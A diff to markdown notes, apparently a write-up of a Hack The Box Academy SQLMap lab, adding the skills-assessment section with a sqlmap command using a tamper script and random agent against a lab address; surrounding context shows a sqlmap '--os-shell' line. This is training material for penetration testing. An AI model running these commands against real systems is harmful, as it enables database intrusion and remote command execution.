@@ -202,12 +202,19 @@ sqlmap -r os-exploit.req --batch -p "id" --os-shell
 
 >[SQLMAP Skills Assessment](https://academy.hackthebox.com/module/58/section/534)  
 
+![mimishop-sqlmap](/images/mimishop-sqlmap.png)  
+
 >You are given access to a web application with basic protection mechanisms.
 >Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. 
 >To complete this module, find the flag and submit it here.  
 
-```
+>Burp Suite detected the SQL Injection vulnerability at [http://94.237.51.159:49252/action.php](http://94.237.51.159:49252/action.php).  
 
+![sqlmap-skills-assessment-detect](/images/sqlmap-skills-assessment-detect.png)  
+
+```
+sqlmap -r mimishop-action.req --batch -p 'id' --random-agent --tamper=between -dbms MySQL --flush-session
 ```  
+
 
 
